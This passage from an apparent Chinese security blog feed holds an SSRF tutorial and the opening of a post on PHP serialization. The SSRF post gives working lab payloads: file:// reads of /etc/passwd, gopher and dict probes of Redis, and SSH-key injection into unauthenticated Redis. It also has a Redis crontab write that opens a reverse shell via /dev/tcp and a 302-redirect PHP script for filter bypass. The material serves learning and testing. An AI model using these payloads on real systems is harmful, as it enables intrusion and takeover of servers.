class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$curl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$curl</span>);</span><br></pre></td></tr></table></figure><p>此段函数的主要功能就是获取get参数中的url的值，然后通过curl_exec()执行相应的会话，此函数应该在参数$ch被初始化并设置相应的选项后才能被调用。</p><p>下面我们分别通过gopher、dict、file协议对主机进行相应的攻击</p><p>利用方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//file</span><br><span class="line">curl http://127.0.0.1?url=file:///etc/passwd</span><br><span class="line"></span><br><span class="line">//dict</span><br><span class="line">curl http://127.0.0.1?url=dict://127.0.0.1:3306/info</span><br><span class="line"></span><br><span class="line">//gopher 探测redis端口</span><br><span class="line">curl http://127.0.0.1?url=gopher://127.0.0.1:6379/_payload</span><br></pre></td></tr></table></figure><h2 id="SSRF-redis未授权"><a href="#SSRF-redis未授权" class="headerlink" title="SSRF redis未授权"></a>SSRF redis未授权</h2><p>首先明确一个东西，什么是redis？redis就是一个数据库，用C语言编写，相较于mssql、mysql这些数据库，redis支持存储的数据类型更多，支持的数据操作也更多。</p><p>为什么会有redis未授权访问漏洞呢？</p><p>因为redis在安装时，默认情况下是将服务绑定在服务器的<code>0.0.0.0:6379</code>端口下（如果配置人员不做更改的话），这样会将redis服务暴露在公网上，如果在未开启认证的情况下，会导致任意用户访问redis服务器，并读取redis数据库中的数据信息。还可以利用相关redis方法，向redis数据库中写入公钥，进而获得私钥登录目标服务器。</p><h4 id="实践一"><a href="#实践一" class="headerlink" title="实践一"></a>实践一</h4><ul><li>受害机环境说明：ubuntu虚拟机下装了docker的环境，并将docker的6379端口映射到Ubuntu的6379端口上，ip：192.168.128.138</li><li>攻击机环境：kali</li></ul><p>首先用nmap探测以下6379端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 6379 -script redis-info  192.168.128.138</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621160935898.png" alt="image-20200621160935898"></p><p>可以得到redis的相关信息。</p><p>用kali的本地redis服务访问redis服务器。</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621162408047.png" alt="image-20200621162408047"></p><ul><li>查看key信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get key</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621162609419.png" alt="image-20200621162609419"></p><ul><li><p>本地生成一个ssh密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成密钥</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; key.txt  //将密钥内容写入key.txt,\n换行的原因时避免与redis数据库缓冲区中的其他数据混合</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621163330300.png" alt="image-20200621163330300"></p></li><li><p>上传到目标服务器</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /key.txt | /usr/bin/redis-cli -h 192.168.128.138 -x set xxx  //-x参数的作用是：表示将标准输入的内容作为最后一个参数的内容，这段命令的作用是将key.txt的内容作为xxx键的值</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621164513608.png" alt="image-20200621164513608"></p><p>最后在攻击机用用ssh登录。(一般实际情况这种理想情况很少见)</p><h4 id="实践二"><a href="#实践二" class="headerlink" title="实践二"></a>实践二</h4><p>实践2用P师傅的一个docker环境，weblogic-ssrf，安装略过，地址：<a href="https://vulhub.org/#/environments/weblogic/ssrf/">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><p>weblogic机器IP：172.18.0.3</p><p>redis机器IP：172.18.0.2</p><ul><li>首先来到存在漏洞的页面：</li></ul><p>·<code>http://172.10.0.2:7001/uddiexplorer/SearchPublicRegistries.jsp</code>。</p><p>用burp抓一个包，关注operator这个参数，可以看到是一个网址，我们输入<a href="http://127.0.0.1:7001发送看看">http://127.0.0.1:7001发送看看</a></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200622164520880.png" alt="image-20200622164520880"></p><p>发送后，页面回复了一个错误，7001这个端口是weblogic的默认端口，返回的是404状态码，这说明什么，说明7001端口可以访问，但是没有找到我们想要的资源</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200622165035234.png" alt="image-20200622165035234"></p><p>端口改为80和9999，返回的是could not connect，说明这个端口是不可访问的</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200622165547149.png" alt="image-20200622165547149"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200622170054635.png" alt="image-20200622170054635"></p><p>现在梳理一下两个状态</p><ul><li>可访问：返回相关状态码</li><li>不可访问：返回不可连接</li></ul><p>下面我们来探测一下redis服务。redis的默认端口为6379，我们把url修改为redis服务器的地址和端口：<a href="http://172.18.0.2:6379/">http://172.18.0.2:6379</a></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200622171452901.png" alt="image-20200622171452901"></p><p>说明6379端口是开放的，把下面的命令url编码一下发送过去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot; </span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>第一句：一个非常经典的tcp下反弹shell的命令，要在命令前后<strong>多增加几行换行符</strong>，这样以便将命令与redis存入的脏数据分隔开</li><li>第二条：将redis的存储路径设置为/etc</li><li>第三条：存储文件名设置为drontab，也就是设置为一个定时任务</li><li>第四条：保存</li></ul><p>可以看到成功反弹了一个shell</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/456.png" alt="456"></p><h2 id="SSRF-30x-跳转"><a href="#SSRF-30x-跳转" class="headerlink" title="SSRF 30x 跳转"></a>SSRF 30x 跳转</h2><p>原理：当请求的URL存在30x跳转时，浏览器会继续请求设定好的URL</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>漏洞页面，存在远程服务器上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="literal">true</span>);<span class="comment">//设定重定向</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制协议为http/https</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>,CURLOPT_PROTOCOLS,CURLPROTO_HTTP|CURLPROTO_HTTPS);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">        curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造的302.php，并将此脚本放在一个公网IP上，确保目标服务器可以请求到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$protocol</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line">    <span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;</span><br><span class="line">        header(<span class="string">&quot;Location:<span class="subst">$protocol</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Location:<span class="subst">$protocol</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>说明</p><ul><li>目标服务器：test.com</li><li>存放脚本的公网IP：120.25.65.12</li><li>利用payload<strong>（%26是&amp;的URL编码，避免浏览器将参数解析成ssrf.php的参数）</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> dict 协议探测  dict://127.0.0.1:6379</span></span><br><span class="line"></span><br><span class="line">curl -v http://test.com/ssrf.php?url=http://120.25.65.12/302.php?s=dict%26i=127.0.0.1%26p=6379%26q=info</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> file协议 文件读取  file:///etc/passwd</span></span><br><span class="line"></span><br><span class="line">curl -v http://test.com/ssrf.php?url=http://120.25.65.12/302.php?s=file%26i=/etc/passwd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gopher协议攻击redis反弹shell  gopher://127.0.0.1:6379/_相关反弹shell的payload</span></span><br><span class="line"></span><br><span class="line">curl -v http://test.com/ssrf.php?url=http://10.25.65.12/302.php?s=gopher%26i=127.0.0.1%26p=3679%26q=_相关反弹shell的payload</span><br></pre></td></tr></table></figure><h2 id="SSRF-DNS重绑定"><a href="#SSRF-DNS重绑定" class="headerlink" title="SSRF DNS重绑定"></a>SSRF DNS重绑定</h2><p>首先来了解两个基本概念</p><p>DNS服务器：</p><ul><li>计算机域名服务器。是一个将<strong>域名和IP地址</strong>相互映射的一个分布式数据库。</li></ul><p>域名解析：</p><ul><li>将一个域名解析到一个IP地址，让人们可以通过访问这个域名来访问到这个IP。<ul><li>A记录：将域名指向一个Ipv4地址</li><li>AAAA记录：将域名指向一个iPv6地址</li><li>C记录：将一个域名1指向域名2，则域名1也可以通过域名2来进行访问</li><li>MIX：将域名指向一个邮箱服务器</li><li>…..</li></ul></li></ul><p>TTL</p><ul><li>生存时间。表示DNS记录在DNS服务器上缓存时间。也就是说当一个DNS服务器成功解析一个域名后，这个解析记录在此台DNS服务器上保存的时间，超过这个时间，该记录就会被销毁，再次请求时，会重新进行查找解析。</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200624163507221.png" alt="image-20200624163507221"></p><p>DNS重绑定主要利用的是可以设置域名解析的缓存时长TTL，下图是一个网站请求URL的步骤</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625093327592.png" alt="image-20200625093327592"></p><p> <strong>(图源网络)</strong></p><p>我们的利用点主要在红色框框圈出来的这部分时间内</p><p>v<img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200624202211965.png" alt="image-20200624202211965"></p><p>由上面的知识我们可以知道，一个域名的解析记录缓存时间可以设置，由图我们可以知道，服务器的相关执行顺序：</p><ol><li>先从DNS服务器解析，获得URL的IP地址</li><li>将获取的IP地址与预先设定的规则进行匹配，判断是否符合请求条件</li><li>如果符合条件则进行请求</li></ol><p>我们可以在第一步和第三步做文章，思路如下</p><p><strong>在服务器第一次请求DNS服务器获取IP时，也就是要获得url的IP进行判断之前，我们将域名的IP解析到一个合理的公网IP1上，然后将TTL设置成0；</strong></p><p>服务器进行判断后，认为这个IP符合正常条件，则进入下一步请求内容，我们利用的就是服务器判断的这个间隙，<strong>在这个间隙之间，如果我们将网址解析到127.0.0.1</strong>的话，那么服务器后续再进行请求时，<strong>如果没有使用第一步请求的IP</strong>，而是直接用域名去请求内容的话，那就可能请求到内网的一些信息。</p><p>但是这个要求比较高，不同的DNS服务器有相应的TTL限制，比如阿里云默认10min，国外0。</p><p><a href="https://xz.aliyun.com/t/7495">https://xz.aliyun.com/t/7495</a></p><p>这里留个坑后面补，学写DNS解析服务器</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul><li>服务器端提供了向其他服务器请求资源获取数据的权限但未对请求的目标地址做有效的过滤。</li></ul><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ul><li><p>302绕过</p><ul><li>构造302跳转php</li></ul></li><li><p>IP编码绕过</p><ul><li>hex编码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line"># 十六进制</span><br><span class="line">0x7f.0x0.0x0.0x1</span><br><span class="line"></span><br><span class="line"># 八进制</span><br><span class="line">0177.0.0.01</span><br><span class="line"></span><br><span class="line">#混合编码</span><br><span class="line">0177.0.0.0x1</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200624203022881.png" alt="image-20200624203022881"></p></li><li><p>xip.io绕过：<a href="http://xip.io/">http://xip.io/</a></p></li><li><p>协议绕过</p><ul><li>gopher</li><li>file</li><li>dict等</li></ul></li><li><p>DNS重绑定</p><ul><li>要求服务器对资源的请求直接使用curl(用户输入的网址)，而不是沿用进行判断时使用的IP</li></ul></li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>针对存在url操作的点进行相关过滤、判断</li><li>url白名单</li><li>禁止30x跳转</li></ul><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a></p><p><a href="https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/">https://k-ring.github.io/2019/05/31/对万金油gopher协议的理解与应用/</a></p><p><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf攻击内网应用复现/</a></p><p><a href="https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://damit5.com/2018/05/26/SSRF-漏洞学习/</a></p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf?tdsourcetag=s_pctim_aiomsg">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://www.anquanke.com/post/id/86527">https://www.anquanke.com/post/id/86527</a></p><p><a href="https://xz.aliyun.com/t/7495">https://xz.aliyun.com/t/7495</a></p><p><a href="http://blog.leanote.com/post/snowming/e2c24cf057a4">http://blog.leanote.com/post/snowming/e2c24cf057a4</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/">https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/</a></p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;SSRF：服务端请求伪造漏洞&lt;/li&gt;
&lt;li&gt;原理：由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用在外网探测或攻击内网服务。漏洞大多数发生在连接外网与内网的跳板机中&lt;/li&gt;
&lt;li&gt;成因：服务器未对发起请求的URL进行有效检测和过滤。&lt;/li&gt;
&lt;li&gt;哪些地方容易出现SSRF：&lt;ul&gt;
&lt;li&gt;网站的分享功能&lt;/li&gt;
&lt;li&gt;在线翻译，通过URL地址进行翻译&lt;/li&gt;
&lt;li&gt;PC到手机的转码服务（通过url把原网址内容转成适合手机阅读的情况）&lt;/li&gt;
&lt;li&gt;图片文章的加载、下载、收藏&lt;/li&gt;
&lt;li&gt;……..&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://example.com/2019/09/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2019/09/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2019-09-17T16:00:00.000Z</published>
    <updated>2021-10-25T05:12:49.536Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><ul><li>序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。</li><li>反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。</li></ul><p> 为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p><span id="more"></span><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="serialize："><a href="#serialize：" class="headerlink" title="serialize："></a>serialize：</h3><ul><li>语法格式：serialize ( mixed $value )</li><li>作用：返回一个字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</li></ul><hr><ul><li>栗子1</li></ul><p>在test.php中，写段代码把php中常用的类型都序列化一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;类序列化之前数值类型：&quot;</span>.gettype(<span class="variable">$test1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$testSerialize</span> = serialize(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$testSerialize</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;类序列化之后数值类型：&quot;</span>.gettype(<span class="variable">$testSerialize</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$arr</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="number">123456</span>;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="string">&#x27;address&#x27;</span>] = <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;数组序列化之后数值类型：&quot;</span>.gettype(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$arrSerialize</span> = serialize(<span class="variable">$arr</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;数组序列化之后：&quot;</span>.<span class="variable">$arrSerialize</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$number</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;int 序列化之后：&quot;</span>.serialize(<span class="variable">$number</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;asdfgh&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;string 序列化后：&quot;</span>.serialize(<span class="variable">$str</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>来看看浏览器的输出：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled.png"></p><blockquote><p><strong>O:4:”test”:2:{s:4:”name”;s:4:”user”;s:3:”age”;i:20;}</strong></p></blockquote><p>这串字符串代表什么？</p><p>先来看大括号外面的部分：</p><blockquote><p><code>O:4:&quot;test&quot;:2</code>：<code>O</code>表示这是一个object类型，<code>4</code>表示初始化的这个类名的长度为4，<code>test</code>为序列化的类名（注意这里不是你传入的变量名，而是你最初初始化的那个类的类名），<code>2</code>表示这个对象中的变量个数</p></blockquote><p>再来看大括号里面的部分：</p><blockquote><p><code>&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;</code>：分成两部分看，用中间分号间隔<br><code>s:4:&quot;name&quot;;</code>：表示第一个变量名为name，长度为4，类型为string<br><code>s:4:&quot;user&quot;;</code>：紧跟在name变量的序列化后面，表示name这个变量的值为user<br><code>s:3:&quot;age&quot;;i:20;</code>：第二个变量名为age，变量名长度为3，变量名为string类型；变量的值为20，为int类型</p></blockquote><p>其余的输出以此方式类推，可见，当用serialize函数序列化一个值后，会记录该对象的名称，名称长度，包含的变量个数及变量详情等内容。</p><p>注意：由于serialize()函数序列化的是对应的定义的类，所以当一个对象在创建时，如果没有对类中的所有变量进行赋值，在序列化该对象的时候，实际是序列化的定义的类。</p><hr><ul><li>栗子2</li></ul><p>如在test类中新增flag变量，但是在创建对象时不对他进行赋值，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$flag</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$test1</span>));</span><br></pre></td></tr></table></figure><p>在序列化的时候会是下面这样：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled1.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%201.png"></p><p>在值得那里会描述为N，即null的缩写。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>可传入的数值类型：object、number、array、string等</li><li>序列化后的格式：参见上文</li></ul><h3 id="unserialize："><a href="#unserialize：" class="headerlink" title="unserialize："></a>unserialize：</h3><ul><li>格式：unserialize ( string $str )</li><li>返回值：返回的是转换之后的值，可为int、string、array、object等<ul><li>如果传递的字符串不可解序列化，则返回 **<code>FALSE</code>**，并产生一个 **<code>E_NOTICE</code>**。</li></ul></li><li>作用：对传入的string进行操作，将其转换为相应的php结构并返回</li></ul><hr><ul><li>栗子3</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="comment">//var $flag;</span></span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span 